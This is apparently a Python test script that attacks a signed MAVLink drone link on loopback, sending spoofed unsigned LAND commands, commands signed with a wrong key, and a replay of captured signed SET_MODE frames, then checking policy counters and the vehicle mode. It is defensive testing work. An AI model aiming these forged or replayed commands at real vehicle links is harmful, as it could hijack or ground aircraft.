"""Attacks against a signed link (all via the hub, loopback).

usage: attack_signed.py <tapfile> <wrongkeyfile> [v1]
Stages: unsigned forged LAND from sysid 66 and 255 (MAVLink 2, or v1 with the arg), a LAND signed with a wrong
key from 255, and a byte-identical replay of a captured genuine signed SET_MODE(LOITER). Prints bridge policy
counter deltas and the vehicle mode after each stage.
"""
import json
import os
import socket
import sys
import time
import urllib.request

tap, wrongkey = sys.argv[1], sys.argv[2]
v1 = len(sys.argv) > 3 and sys.argv[3] == "v1"
if not v1:
    os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402


def policy():
    s = json.load(urllib.request.urlopen("http://127.0.0.1:8090/status", timeout=3))
    p = s.get("policy") or {}
    return {k: v for k, v in p.items() if isinstance(v, int) and not isinstance(v, bool)}


seen = {"mode": None}


def watch(c, secs):
    end = time.time() + secs
    while time.time() < end:
        msg = c.recv_match(type="HEARTBEAT", blocking=True, timeout=0.5)
        if msg is not None and msg.get_srcSystem() == 1:
            seen["mode"] = msg.custom_mode


def conn(sysid, key=None):
    c = mavutil.mavlink_connection("tcp:127.0.0.1:5801", source_system=sysid, source_component=190)
    if key is not None:
        c.setup_signing(key, sign_outgoing=True, allow_unsigned_callback=lambda *a: True, link_id=1)
    else:
        c.setup_signing(b"\x00" * 32, sign_outgoing=False, allow_unsigned_callback=lambda *a: True)
    return c


def forge(c, n=5):
    for _ in range(n):
        c.mav.command_long_send(1, 1, 176, 0, 1, 9, 0, 0, 0, 0, 0)   # DO_SET_MODE custom 9 = LAND
        c.mav.set_mode_send(1, 1, 9)
        time.sleep(0.4)


def stage(name, fn):
    before = policy()
    fn()
    time.sleep(1)
    watch(a66, 2)
    after = policy()
    delta = {k: after[k] - before.get(k, 0) for k in after if after[k] != before.get(k, 0)}
    print(f"STAGE {name}: vehicle_mode={seen['mode']} delta={json.dumps(delta)}", flush=True)


a66 = conn(66)
a255 = conn(255)
watch(a66, 3)
print("mode before", seen["mode"], "counters", policy(), flush=True)
sfx = "_v1" if v1 else ""
stage("unsigned_sys66" + sfx, lambda: forge(a66))
stage("unsigned_sys255" + sfx, lambda: forge(a255))
if not v1:
    stage("wrong_key_sys255", lambda: forge(conn(255, open(wrongkey, "rb").read())))

    def replay():
        mav = mavutil.mavlink.MAVLink(None)
        mav.robust_parsing = True
        frames = []
        for b in open(tap, "rb").read():
            msg = mav.parse_char(bytes([b]))
            if msg is not None and msg.get_type() == "SET_MODE" and msg.custom_mode == 5 \
                    and msg.get_header().incompat_flags & 1 and msg.get_srcSystem() == 255:
                frames.append(bytes(msg.get_msgbuf()))
        print("captured signed SET_MODE(LOITER) frames:", len(frames), flush=True)
        if frames:
            s = socket.create_connection(("127.0.0.1", 5801))
            for _ in range(3):
                s.sendall(frames[0])
                time.sleep(0.5)
            s.close()
    stage("replay_signed_setmode", replay)
print("attack done", flush=True)
